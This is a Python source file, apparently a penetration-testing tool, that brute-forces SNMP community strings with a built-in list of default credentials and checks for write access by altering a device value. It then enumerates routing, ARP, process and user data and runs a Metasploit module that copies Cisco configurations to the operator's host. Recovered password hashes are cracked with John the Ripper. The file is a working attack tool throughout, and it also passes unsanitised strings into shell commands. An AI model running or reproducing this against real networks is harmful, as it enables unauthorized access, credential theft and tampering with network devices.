#!/usr/bin/env python
# SNMP Bruteforce & Enumeration Script
# Requires metasploit, snmpwalk, snmpstat and john the ripper
__version__ = 'v1.0b'
from socket import socket, SOCK_DGRAM, AF_INET, timeout
from random import randint
from time import sleep
import optparse, sys, os
from subprocess import Popen, PIPE
import struct
import threading, thread
import tempfile

from scapy.all import (SNMP, SNMPnext, SNMPvarbind, ASN1_OID, SNMPget, ASN1_DECODING_ERROR, ASN1_NULL, ASN1_IPADDRESS,
                       SNMPset, SNMPbulk, IP)

##########################################################################################################
#	Defaults
##########################################################################################################
class defaults:
	rate=30.0
	timeOut=2.0
	port=161
	delay=2
	interactive=True
	verbose=False
	getcisco=True
	colour=True

default_communities=['','0','0392a0','1234','2read','3com','3Com','3COM','4changes','access','adm','admin','Admin','administrator','agent','agent_steal','all','all private','all public','anycom','ANYCOM','apc','bintec','blue','boss','c','C0de','cable-d','cable_docsispublic@es0','cacti','canon_admin','cascade','cc','changeme','cisco','CISCO','cmaker','comcomcom','community','core','CR52401','crest','debug','default','demo','dilbert','enable','entry','field','field-service','freekevin','friend','fubar','guest','hello','hideit','host','hp_admin','ibm','IBM','ilmi','ILMI','intel','Intel','intermec','Intermec','internal','internet','ios','isdn','l2','l3','lan','liteon','login','logon','lucenttech','lucenttech1','lucenttech2','manager','master','microsoft','mngr','mngt','monitor','mrtg','nagios','net','netman','network','nobody','NoGaH$@!','none','notsopublic','nt','ntopia','openview','operator','OrigEquipMfr','ourCommStr','pass','passcode','password','PASSWORD','pr1v4t3','pr1vat3','private',' private','private ','Private','PRIVATE','private@es0','Private@es0','private@es1','Private@es1','proxy','publ1c','public',' public','public ','Public','PUBLIC','public@es0','public@es1','public/RO','read','read-only','readwrite','read-write','red','regional','<removed>','rmon','rmon_admin','ro','root','router','rw','rwa','sanfran','san-fran','scotty','secret','Secret','SECRET','Secret C0de','security','Security','SECURITY','seri','server','snmp','SNMP','snmpd','snmptrap','snmp-Trap','SNMP_trap','SNMPv1/v2c','SNMPv2c','solaris','solarwinds','sun','SUN','superuser','supervisor','support','switch','Switch','SWITCH','sysadm','sysop','Sysop','system','System','SYSTEM','tech','telnet','TENmanUFactOryPOWER','test','TEST','test2','tiv0li','tivoli','topsecret','traffic','trap','user','vterm1','watch','watchit','windows','windowsnt','workstation','world','write','writeit','xyzzy','yellow','ILMI']

##########################################################################################################
#	OID's
##########################################################################################################
''' Credits
Some OID's borowed from Cisc0wn script
# Cisc0wn - The Cisco SNMP 0wner.
# Daniel Compton
# www.commonexploits.com
# contact@commexploits.com
'''

RouteOIDS={
	'ROUTDESTOID':	[".1.3.6.1.2.1.4.21.1.1", "Destination"],
	'ROUTHOPOID':	[".1.3.6.1.2.1.4.21.1.7", "Next Hop"],
	'ROUTMASKOID':	[".1.3.6.1.2.1.4.21.1.11", "Mask"],
	'ROUTMETOID':	[".1.3.6.1.2.1.4.21.1.3", "Metric"],
	'ROUTINTOID':	[".1.3.6.1.2.1.4.21.1.2", "Interface"],
	'ROUTTYPOID':	[".1.3.6.1.2.1.4.21.1.8", "Route type"],
	'ROUTPROTOID':	[".1.3.6.1.2.1.4.21.1.9", "Route protocol"],
	'ROUTAGEOID':	[".1.3.6.1.2.1.4.21.1.10", "Route age"]
}

InterfaceOIDS={
	#Interface Info
	'INTLISTOID':	[".1.3.6.1.2.1.2.2.1.2", "Interfaces"],
	'INTIPLISTOID':	[".1.3.6.1.2.1.4.20.1.1", "IP address"],
	'INTIPMASKOID':	[".1.3.6.1.2.1.4.20.1.3", "Subnet mask"],
	'INTSTATUSLISTOID':[".1.3.6.1.2.1.2.2.1.8", "Status"]
}

ARPOIDS={
	# Arp table
	'ARPADDR':		[".1.3.6.1.2.1.3.1 ","ARP address method A"],
	'ARPADDR2':		[".1.3.6.1.2.1.3.1 ","ARP address method B"]
}

OIDS={
	'SYSTEM':["iso.3.6.1.2.1.1 ","SYSTEM Info"]
}

snmpstat_args={
	'Interfaces':["-Ci","Interface Info"],
	'Routing':["-Cr","Route Info"],
	'Netstat':["","Netstat"],
	#'Statistics':["-Cs","Stats"]
}

'''Credits
The following OID's are borrowed from snmpenum.pl script
#        ----by filip waeytens 2003----
#        ----  DA SCANIT CREW www.scanit.be ----
#         filip.waeytens@hushmail.com
'''

WINDOWS_OIDS={
	'RUNNING PROCESSES':	["1.3.6.1.2.1.25.4.2.1.2","Running Processes"],
	'INSTALLED SOFTWARE':	["1.3.6.1.2.1.25.6.3.1.2","Installed Software"],
	'SYSTEM INFO':	["1.3.6.1.2.1.1","System Info"],
	'HOSTNAME':	["1.3.6.1.2.1.1.5","Hostname"],
	'DOMAIN':	["1.3.6.1.4.1.77.1.4.1","Domain"],
	'USERS':	["1.3.6.1.4.1.77.1.2.25","Users"],
	'UPTIME':	["1.3.6.1.2.1.1.3","UpTime"],
	'SHARES':	["1.3.6.1.4.1.77.1.2.27","Shares"],
	'DISKS':	["1.3.6.1.2.1.25.2.3.1.3","Disks"],
	'SERVICES':	["1.3.6.1.4.1.77.1.2.3.1.1","Services"],
	'LISTENING TCP PORTS':	["1.3.6.1.2.1.6.13.1.3.0.0.0.0","Listening TCP Ports"],
	'LISTENING UDP PORTS':	["1.3.6.1.2.1.7.5.1.2.0.0.0.0","Listening UDP Ports"]
}

LINUX_OIDS={
	'RUNNING PROCESSES':	["1.3.6.1.2.1.25.4.2.1.2","Running Processes"],
	'SYSTEM INFO':	["1.3.6.1.2.1.1","System Info"],
	'HOSTNAME':	["1.3.6.1.2.1.1.5","Hostname"],
	'UPTIME':	["1.3.6.1.2.1.1.3","UpTime"],
	'MOUNTPOINTS':	["1.3.6.1.2.1.25.2.3.1.3","MountPoints"],
	'RUNNING SOFTWARE PATHS':	["1.3.6.1.2.1.25.4.2.1.4","Running Software Paths"],
	'LISTENING UDP PORTS':	["1.3.6.1.2.1.7.5.1.2.0.0.0.0","Listening UDP Ports"],
	'LISTENING TCP PORTS':	["1.3.6.1.2.1.6.13.1.3.0.0.0.0","Listening TCP Ports"]
}

CISCO_OIDS={
	'LAST TERMINAL USERS':	["1.3.6.1.4.1.9.9.43.1.1.6.1.8","Last Terminal User"],
	'INTERFACES':	["1.3.6.1.2.1.2.2.1.2","Interfaces"],
	'SYSTEM INFO':	["1.3.6.1.2.1.1.1","System Info"],
	'HOSTNAME':	["1.3.6.1.2.1.1.5","Hostname"],
	'SNMP Communities':	["1.3.6.1.6.3.12.1.3.1.4","Communities"],
	'UPTIME':	["1.3.6.1.2.1.1.3","UpTime"],
	'IP ADDRESSES':	["1.3.6.1.2.1.4.20.1.1","IP Addresses"],
	'INTERFACE DESCRIPTIONS':	["1.3.6.1.2.1.31.1.1.1.18","Interface Descriptions"],
	'HARDWARE':	["1.3.6.1.2.1.47.1.1.1.1.2","Hardware"],
	'TACACS SERVER':	["1.3.6.1.4.1.9.2.1.5","TACACS Server"],
	'LOG MESSAGES':	["1.3.6.1.4.1.9.9.41.1.2.3.1.5","Log Messages"],
	'PROCESSES':	["1.3.6.1.4.1.9.9.109.1.2.1.1.2","Processes"],
	'SNMP TRAP SERVER':	["1.3.6.1.6.3.12.1.2.1.7","SNMP Trap Server"]
}

##########################################################################################################
#	Classes
##########################################################################################################

class SNMPError(Exception):
	'''Credits
	Class copied from sploitego project
	__original_author__ = 'Nadeem Douba'
	https://github.com/allfro/sploitego/blob/master/src/sploitego/scapytools/snmp.py
	'''
	pass

class SNMPVersion:
	'''Credits
	Class copied from sploitego project
	__original_author__ = 'Nadeem Douba'
	https://github.com/allfro/sploitego/blob/master/src/sploitego/scapytools/snmp.py
	'''
	v1 = 0
	v2c = 1
	v3 = 2

	@classmethod
	def iversion(cls, v):
		if v in ['v1', '1']:
			return cls.v1
		elif v in ['v2', '2', 'v2c']:
			return cls.v2c
		elif v in ['v3', '3']:
			return cls.v3
		raise ValueError('No such version %s' % v)

	@classmethod
	def sversion(cls, v):
		if not v:
			return 'v1'
		elif v == 1:
			return 'v2c'
		elif v == 2:
			return 'v3'
		raise ValueError('No such version number %s' % v)

class SNMPBruteForcer(object):
	#This class is used for the sploitego method of bruteforce (--sploitego)
	'''Credits
	Class copied from sploitego project
	__original_author__ = 'Nadeem Douba'
	https://github.com/allfro/sploitego/blob/master/src/sploitego/scapytools/snmp.py
	'''
	def __init__(self, agent, port=161, version='v2c', timeout=0.5, rate=1000):
		self.version = SNMPVersion.iversion(version)
		self.s = socket(AF_INET, SOCK_DGRAM)
		self.s.settimeout(timeout)
		self.addr = (agent, port)
		self.rate = rate

	def guess(self, communities):

		p = SNMP(
			version=self.version,
			PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1.0'))])
		)
		r = []
		for c in communities:
			i = randint(0, 2147483647)
			p.PDU.id = i
			p.community = c
			self.s.sendto(str(p), self.addr)
			sleep(1/self.rate)
		while True:
			try:
				p = SNMP(self.s.recvfrom(65535)[0])
			except timeout:
				break
			r.append(p.community.val)
		return r

	def __del__(self):
		self.s.close()

class SNMPResults:
	addr=''
	version=''
	community=''
	write=False

	def __eq__(self, other):
		return self.addr == other.addr and self.version == other.version and self.community == other.community

##########################################################################################################
#	Colour output functions
##########################################################################################################

# for color output
BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)

#following from Python cookbook, #475186
def has_colours(stream):
    if not hasattr(stream, "isatty"):
        return False
    if not stream.isatty():
        return False # auto color only on TTYs
    try:
        import curses
        curses.setupterm()
        return curses.tigetnum("colors") > 2
    except:
        # guess false in case of error
        return False
has_colours = has_colours(sys.stdout)

def printout(text, colour=WHITE):

	if has_colours and defaults.colour:
			seq = "\x1b[1;%dm" % (30+colour) + text + "\x1b[0m\n"
			sys.stdout.write(seq)
	else:
			#sys.stdout.write(text)
			print text


##########################################################################################################
#	
##########################################################################################################

def banner(art=True):
	if art:
		print >> sys.stderr,  "   _____ _   ____  _______     ____             __     "
		print >> sys.stderr,  "  / ___// | / /  |/  / __ \\   / __ )_______  __/ /____ "
		print >> sys.stderr,  "  \\__ \\/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \\"
		print >> sys.stderr,  " ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/"
		print >> sys.stderr,  "/____/_/ |_/_/  /_/_/      /_____/_/   \\__,_/\\__/\\___/ "
		print >> sys.stderr,  ""
		print >> sys.stderr,  "SNMP Bruteforce & Enumeration Script " + __version__
		print >> sys.stderr,  "http://www.secforce.com / nikos.vassakis <at> secforce.com"
		print >> sys.stderr, "###############################################################"
		print >> sys.stderr,  ""

def listener(sock,results):
	while True:
		try:
			response,addr=SNMPrecv(sock)
		except timeout:
			continue
		except KeyboardInterrupt:
			break
		except:
			break
		r=SNMPResults()
		r.addr=addr
		r.version=SNMPVersion.sversion(response.version.val)
		r.community=response.community.val
		results.append(r)
		printout (('%s : %s \tVersion (%s):\t%s' % (str(addr[0]),str(addr[1]), SNMPVersion.sversion(response.version.val),response.community.val)),WHITE)

def SNMPrecv(sock):
	try:
		recv,addr=sock.recvfrom(65535)
		response = SNMP(recv)
		return response,addr
	except:
		raise
		
def SNMPsend(sock, packets, ip, port=defaults.port, community='', rate=defaults.rate):
	addr = (ip, port)
	for packet in packets:
		i = randint(0, 2147483647)
		packet.PDU.id = i
		packet.community = community
		sock.sendto(str(packet), addr)
		sleep(1/rate)

def SNMPRequest(result,OID, value='', TimeOut=defaults.timeOut):
	s = socket(AF_INET, SOCK_DGRAM)
	s.settimeout(TimeOut)
	response=''
	r=result

	version = SNMPVersion.iversion(r.version)
	if value:
		p = SNMP(
			version=version,
			PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(OID), value=value)])
			)
	else:
		p = SNMP(
			version=version,
			PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID(OID))])
			)

	SNMPsend(s,p,r.addr[0],r.addr[1],r.community)
	for x in range(0, 5):
		try:
			response,addr=SNMPrecv(s)
			break
		except timeout:	# if request times out retry
			sleep(0.5)
			continue
	s.close
	if not response:
		raise timeout
	return response

def testSNMPWrite(results,options,OID='.1.3.6.1.2.1.1.4.0'):
	#Alt .1.3.6.1.2.1.1.5.0

	setval='HASH(0xDEADBEF)'
	for r in results:
		try:
			originalval=SNMPRequest(r,OID)

			if originalval:
				originalval=originalval[SNMPvarbind].value.val

				SNMPRequest(r,OID,setval)
				curval=SNMPRequest(r,OID)[SNMPvarbind].value.val

				if curval == setval:
					r.write=True
					try:
						SNMPRequest(r,OID,originalval)
					except timeout:
						pass
					if options.verbose: printout (('\t %s (%s) (RW)' % (r.community,r.version)),GREEN)
					curval=SNMPRequest(r,OID)[SNMPvarbind].value.val
					if curval != originalval:
						printout(('Couldn\'t restore value to: %s (OID: %s)' % (str(originalval),str(OID))),RED)
				else:
					if options.verbose: printout (('\t %s (%s) (R)' % (r.community,r.version)),BLUE)
			else:
				r.write=None
				printout (('\t %s (%s) (Failed)' % (r.community,r.version)),RED)
		except timeout:
			r.write=None
			printout (('\t %s (%s) (Failed!)' % (r.community,r.version)),RED)
			continue

def generic_snmpwalk(snmpwalk_args,oids):
	for key, val in oids.items():
		try:
			printout(('################## Enumerating %s Table using: %s (%s)'%(key,val[0],val[1])),YELLOW)
			entry={}
			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+' | cut -d\'=\' -f 2').readlines()
					
			print '\tINFO'
			print '\t----\t'
			for i in out:
				print '\t',i.strip()
			print '\n'
		except KeyboardInterrupt:
			pass

def enumerateSNMPWalk(result,options):
	r=result

	snmpwalk_args=' -c "'+r.community+'" -'+r.version+' '+str(r.addr[0])+':'+str(r.addr[1])

	############################################################### 	Enumerate OS
	if options.windows:	
		generic_snmpwalk(snmpwalk_args,WINDOWS_OIDS)
		return
	if options.linux:	
		generic_snmpwalk(snmpwalk_args,LINUX_OIDS)
		return
	if options.cisco:	
		generic_snmpwalk(snmpwalk_args,CISCO_OIDS)
	
	############################################################### 	Enumerate CISCO Specific
	############################################################### 	Enumerate Routes
	entry={}
	out=os.popen('snmpwalk'+snmpwalk_args+' '+'.1.3.6.1.2.1.4.21.1.1'+' '+'| awk \'{print $NF}\' 2>&1''').readlines()
	lines = len(out)

	printout('################## Enumerating Routing Table (snmpwalk)',YELLOW)
	try:
		for key, val in RouteOIDS.items():	#Enumerate Routes
			#print '\t *',val[1], val[0]
			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+'| awk \'{print $NF}\' 2>&1').readlines()
			
			entry[val[1]]=out
			

		print '\tDestination\t\tNext Hop\tMask\t\t\tMetric\tInterface\tType\tProtocol\tAge'
		print '\t-----------\t\t--------\t----\t\t\t------\t---------\t----\t--------\t---'
		for j in range(lines):
			print( '\t'+entry['Destination'][j].strip().ljust(12,' ') +
					'\t\t'+entry['Next Hop'][j].strip().ljust(12,' ') +
					'\t'+entry['Mask'][j].strip().ljust(12,' ')  +
					'\t\t'+entry['Metric'][j].strip().center(6,' ') +
					'\t'+entry['Interface'][j].strip().center(10,' ') +
					'\t'+entry['Route type'][j].strip().center(4,' ') +
					'\t'+entry['Route protocol'][j].strip().center(8,' ') +
					'\t'+entry['Route age'][j].strip().center(3,' ')
			)
	except KeyboardInterrupt:
		pass

	############################################################### 	Enumerate Arp
	print '\n'
	for key, val in ARPOIDS.items():
		try:
			printout(('################## Enumerating ARP Table using: %s (%s)'%(val[0],val[1])),YELLOW)
			entry={}
			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+' | cut -d\'=\' -f 2 | cut -d\':\' -f 2').readlines()

			lines=len(out)/3

			entry['V']=out[0*lines:1*lines]
			entry['MAC']=out[1*lines:2*lines]
			entry['IP']=out[2*lines:3*lines]

			
			print '\tIP\t\tMAC\t\t\tV'
			print '\t--\t\t---\t\t\t--'
			for j in range(lines):
				print(	'\t'+entry['IP'][j].strip().ljust(12,' ') +
						'\t'+entry['MAC'][j].strip().ljust(18,' ') +
						'\t'+entry['V'][j].strip().ljust(2,' ')
				)
			print '\n'
		except KeyboardInterrupt:
			pass

	############################################################### 	Enumerate SYSTEM
	for key, val in OIDS.items():
		try:
			printout(('################## Enumerating %s Table using: %s (%s)'%(key,val[0],val[1])),YELLOW)
			entry={}
			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+' | cut -d\'=\' -f 2').readlines()
					
			print '\tINFO'
			print '\t----\t'
			for i in out:
				print '\t',i.strip()
			print '\n'
		except KeyboardInterrupt:
			pass
	############################################################### 	Enumerate Interfaces
	for key, val in snmpstat_args.items():
		try:
			printout(('################## Enumerating %s Table using: %s (%s)'%(key,val[0],val[1])),YELLOW)
			out=os.popen('snmpnetstat'+snmpwalk_args+' '+val[0]).readlines()
					
			for i in out:
				print '\t',i.strip()
			print '\n'
		except KeyboardInterrupt:
			pass

def get_cisco_config(result,options):
	printout(('################## Trying to get config with: %s'% result.community),YELLOW)

	identified_ip=os.popen('ifconfig eth0 |grep "inet addr:" |cut -d ":" -f 2 |awk \'{ print $1 }\'').read()
	
	if options.interactive:
		Local_ip = raw_input('Enter Local IP ['+str(identified_ip).strip()+']:') or identified_ip.strip()
	else:
		Local_ip = identified_ip.strip()

	if not (os.path.isdir("./output")):
		os.popen('mkdir output')

	p=Popen('msfcli auxiliary/scanner/snmp/cisco_config_tftp RHOSTS='+str(result.addr[0])+' LHOST='+str(Local_ip)+' COMMUNITY="'+result.community+'" OUTPUTDIR=./output RETRIES=1 RPORT='+str(result.addr[1])+' THREADS=5 VERSION='+result.version.replace('v','')+' E ',shell=True,stdin=PIPE,stdout=PIPE, stderr=PIPE) #>/dev/null 2>&1
	

	print 'msfcli auxiliary/scanner/snmp/cisco_config_tftp RHOSTS='+str(result.addr[0])+' LHOST='+str(Local_ip)+' COMMUNITY="'+result.community+'" OUTPUTDIR=./output RETRIES=1 RPORT='+str(result.addr[1])+' THREADS=5 VERSION='+result.version.replace('v','')+' E '

	out=[]
	while p.poll() is None:
		line=p.stdout.readline()
		out.append(line)
		print '\t',line.strip()
	
	printout('################## Passwords Found:',YELLOW)
	encrypted=[]
	for i in out:
		if "Password" in i:
			print '\t',i.strip()
		if "Encrypted" in i:
			encrypted.append(i.split()[-1])

	if encrypted:
		print '\nCrack encrypted password(s)?'
		for i in encrypted:
			print '\t',i

		#if (False if raw_input("(Y/n):").lower() == 'n' else True):
		if not get_input("(Y/n):",'n',options):
			
			with open('./hashes', 'a') as f:
				for i in encrypted:
					f.write(i+'\n')
			
			p=Popen('john ./hashes',shell=True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
			while p.poll() is None:
					print '\t',p.stdout.readline()
			print 'Passwords Cracked:'
			out=os.popen('john ./hashes --show').readlines()
			for i in out: 
				print '\t', i.strip()

	out=[]
	while p.poll() is None:
		line=p.stdout.readline()
		out.append(line)
		print '\t',line.strip()

def select_community(results,options):
	default=None
	try:
		printout("\nIdentified Community strings",WHITE)

		for l,r in enumerate(results):
			if r.write==True:
				printout ('\t%s) %s %s (%s)(RW)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community),str(r.version)),GREEN)
				default=l
			elif r.write==False:
				printout ('\t%s) %s %s (%s)(RO)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community),str(r.version)),BLUE)
			else:
				printout ('\t%s) %s %s (%s)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community),str(r.version)),RED)
		
			if default is None:
				default = l
		
		if not options.enum:
			return
		
		if options.interactive:
			selection=raw_input("Select Community to Enumerate ["+str(default)+"]:")
			if not selection:
				selection=default
		else:
			selection=default
			
		try:
			return results[int(selection)]
		except:
			return results[l]
	except KeyboardInterrupt:
		exit(0)

def SNMPenumeration(result,options):
	getcisco=defaults.getcisco
	try:
		printout (("\nEnumerating with READ-WRITE Community string: %s (%s)" % (result.community,result.version)),YELLOW)
		enumerateSNMPWalk(result,options)
		
		if options.windows or options.linux:
			if not get_input("Get Cisco Config (y/N):",'y',options):
				getcisco=False
		if getcisco: 
			get_cisco_config(result,options)
	except KeyboardInterrupt:
		print '\n'
		return

def password_brutefore(options, communities, ips):
	s = socket(AF_INET, SOCK_DGRAM)
	s.settimeout(options.timeOut)

	results=[]
	
	#Start the listener
	T = threading.Thread(name='listener', target=listener, args=(s,results,))
	T.start()
	
	# Craft SNMP's for both versions
	p1 = SNMP(
		version=SNMPVersion.iversion('v1'),
		PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1.0'))])
		)
	p2c = SNMP(
		version=SNMPVersion.iversion('v2c'),
		PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1.0'))])
		)

	packets = [p1, p2c]

	#We try each community string
	for i,community in enumerate(communities):
		#sys.stdout.write('\r{0}'.format('.' * i))
		#sys.stdout.flush()
		for ip in ips:
			SNMPsend(s, packets, ip, options.port, community.rstrip(), options.rate)

	#We read from STDIN if necessary
	if options.stdin:
		while True:
			try:
				try:
					community=raw_input().strip('\n')
					for ip in ips:
						SNMPsend(s, packets, ip, options.port, community, options.rate)
				except EOFError:
					break				
			except KeyboardInterrupt:
				break

	try:
		print "Waiting for late packets (CTRL+C to stop)"
		sleep(options.timeOut+options.delay)	#Waiting in case of late response
	except KeyboardInterrupt:
		pass
	T._Thread__stop()
	s.close

	#We remove any duplicates. This relies on the __equal__
	newlist = []
	for i in results:
		if i not in newlist:
			newlist.append(i)
	return newlist

def get_input(string,non_default_option,options):
	#(True if raw_input("Enumerate with different community? (Y/n):").lower() == 'n' else False)
	
	if options.interactive:
		if raw_input(string).lower() == non_default_option:
			return True
		else:
			return False
	else:
		print string
		return False

def main():

	parser = optparse.OptionParser(formatter=optparse.TitledHelpFormatter())

	parser.set_usage("python snmp-brute.py -t <IP> -f <DICTIONARY>")
	#parser.add_option('-h','--help', help='Show this help message and exit', action=parser.print_help())
	parser.add_option('-f','--file', help='Dictionary file', dest='dictionary', action='store')
	parser.add_option('-t','--target', help='Host IP', dest='ip', action='store')
	parser.add_option('-p','--port', help='SNMP port', dest='port', action='store', type='int',default=defaults.port)
	

	groupAlt = optparse.OptionGroup(parser, "Alternative Options")
	groupAlt.add_option('-s','--stdin', help='Read communities from stdin', dest='stdin', action='store_true',default=False)
	groupAlt.add_option('-c','--community', help='Single Community String to use', dest='community', action='store')
	groupAlt.add_option('--sploitego', help='Sploitego\'s bruteforce method', dest='sploitego', action='store_true',default=False)


	groupAuto = optparse.OptionGroup(parser, "Automation")
	groupAuto.add_option('-b','--bruteonly', help='Do not try to enumerate - only bruteforce', dest='enum', action='store_false',default=True)
	groupAuto.add_option('-a','--auto', help='Non Interactive Mode', dest='interactive', action='store_false',default=True)
	groupAuto.add_option('--no-colours', help='No colour output', dest='colour', action='store_false',default=True)

	groupAdvanced = optparse.OptionGroup(parser, "Advanced")
	groupAdvanced.add_option('-r','--rate', help='Send rate', dest='rate', action='store',type='float', default=defaults.rate)
	groupAdvanced.add_option('--timeout', help='Wait time for UDP response (in seconds)', dest='timeOut', action='store', type='float' ,default=defaults.timeOut)
	groupAdvanced.add_option('--delay', help='Wait time after all packets are send (in seconds)', dest='delay', action='store', type='float' ,default=defaults.delay)

	groupAdvanced.add_option('--iplist', help='IP list file', dest='lfile', action='store')
	groupAdvanced.add_option('-v','--verbose', help='Verbose output', dest='verbose', action='store_true',default=False)

	groupOS = optparse.OptionGroup(parser, "Operating Systems")
	groupOS.add_option('--windows', help='Enumerate Windows OIDs (snmpenum.pl)', dest='windows', action='store_true',default=False)
	groupOS.add_option('--linux', help='Enumerate Linux OIDs (snmpenum.pl)', dest='linux', action='store_true',default=False)
	groupOS.add_option('--cisco', help='Append extra Cisco OIDs (snmpenum.pl)', dest='cisco', action='store_true',default=False)

	parser.add_option_group(groupAdvanced)
	parser.add_option_group(groupAuto)
	parser.add_option_group(groupOS)
	parser.add_option_group(groupAlt)

	(options, arguments) = parser.parse_args()

	communities=[]
	ips=[]

	banner(options.colour)	#For SPARTA!!!
	
	if not options.ip and not options.lfile:
		#Can't continue without target
		parser.print_help()
		exit(0)
	else:
		# Create the list of targets
		if options.lfile:
			try:
				with open(options.lfile) as t:
					ips = t.read().splitlines()	#Potential DoS
			except:
				print "Could not open targets file: " + options.lfile
				exit(0)
		else:
			ips.append(options.ip)

	if not options.colour:
			defaults.colour=False

	# Create the list of communities
	if options.dictionary:	# Read from file
		with open(options.dictionary) as f:
			communities=f.read().splitlines()	#Potential DoS
	elif options.community:	# Single community
		communities.append(options.community)
	elif options.stdin:		# Read from input
		communities=[]
	else:	#if not options.community and not options.dictionary and not options.stdin:
		communities=default_communities

	#We ensure that default communities are included
	#if 'public' not in communities:
	#	communities.append('public')
	#if 'private' not in communities:
	#	communities.append('private')

	if options.stdin:
		options.interactive=False

	results=[]

	if options.stdin:
		print >> sys.stderr, "Reading input for community strings ..."
	else:
		print >> sys.stderr, "Trying %d community strings ..." % len(communities)

	if options.sploitego: #sploitego method of bruteforce
		if ips:
			for ip in ips:
				for version in ['v1', 'v2c']:
					bf = SNMPBruteForcer(ip, options.port, version, options.timeOut,options.rate)
					result=bf.guess(communities)
					for i in result:
						r=SNMPResults()
						r.addr=(ip,options.port)
						r.version=version
						r.community=i
						results.append(r)
					print ip, version+'\t',result
		else:
			parser.print_help()

	else:
		results = password_brutefore(options, communities, ips)

	#We identify whether the community strings are read or write
	if results:
		printout("\nTrying identified strings for READ-WRITE ...",WHITE)
		testSNMPWrite(results,options)	
	else:
		printout("\nNo Community strings found",RED)
		exit(0)
	
	#We attempt to enumerate the router
	while options.enum:
		SNMPenumeration(select_community(results,options),options)

		#if (True if raw_input("Enumerate with different community? (Y/n):").lower() == 'n' else False):
		if get_input("Enumerate with different community? (y/N):",'y',options):
			continue
		else:
			break
		
	if not options.enum:
		select_community(results,options)
			
		print "Finished!"

if __name__ == "__main__":
	main()
